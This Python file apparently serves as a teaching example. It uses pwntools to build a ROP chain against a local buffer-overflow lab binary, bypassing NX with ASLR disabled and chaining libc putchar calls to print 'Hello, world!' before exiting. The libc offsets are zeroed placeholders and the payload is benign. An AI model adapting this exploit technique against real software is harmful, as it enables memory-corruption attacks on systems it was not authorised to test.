# Example implementation to produce ROP chain for vulnerable program,
# and print 'Hello, world!'

# Program is taking input as argument, as has buffer overflow vulneralibity


# We are using CTP framework 'pwntools' https://github.com/Gallopsled/pwntools

# We are expecting, that ASLR is disabled. Bypassing NX bit

from pwn import log, context
from pwnlib.tubes.process import process
from pwnlib.util.packing import p32, pack
from pwnlib.exception import PwnlibException

context(arch='i386', os='linux')

# NOTE this might vary based on machine
libc_entry = 0x00000000

# NOTE that you might have different offsets, depending on libc version
#  and compiler settings
offset_ppr = 0x00000000  # pop/pop/ret gadget 
offset_pr = 0x00000000  # pop ebx;ret

offset_exit = 0x00000000
offset_putchar = 0x00000000

# 0xf7e6740f


def main():
    # payload = ""
    padChar2 = "\x90"
    padSize = 32
    # Initial payload

    hello = "\nHello, world!\n\n"  # We are using putchar function from libc
    # as example to chain multiple function calls/gadgets
    # For each character in our phrase, there is putchar call
    payload = padChar2 * padSize
    for char in hello:  # Generate payload for printing 'Hello, world!'
        # payload += p32(libc_entry + offset_putchar)  # function p32 changes
        payload += p32(libc_entry + offset_putchar)
        # memoryaddress to correct format (reversed and opcoded)

        # whattodo after = pop/ret gadget
        payload += p32(libc_entry + offset_pr)

        # pwntools function pack, is packing our input to 32-bit memory
        # address with correct syntax. Ord is changing character to ASCII code
        payload += pack(ord(char), 32, 'little',  # function arguments
                        False).replace("\x00", "\xff")
        # Replacing nulls with '\xff', which are generated in by packing to
        #  fullfil 32-bit size

    payload += p32(libc_entry + offset_pr)
    payload += p32(0xffffffff)  # Some address, we do not care, we are exiting
    # so value does not matter.
    payload += p32(libc_entry + offset_exit)

    # Writing payload to txt file just in case,
    # if we want to run program without script
    f = open("payload.txt", "w+")
    f.write(payload)
    f.close

    # C program is using payload as args
    try:
        p = process(["../vuln_progs/Overflow", payload])
        log.info(p.recvall(timeout=0.5))
    except PwnlibException:
        print("Nulls in arguments.")


if __name__ == "__main__":
    main()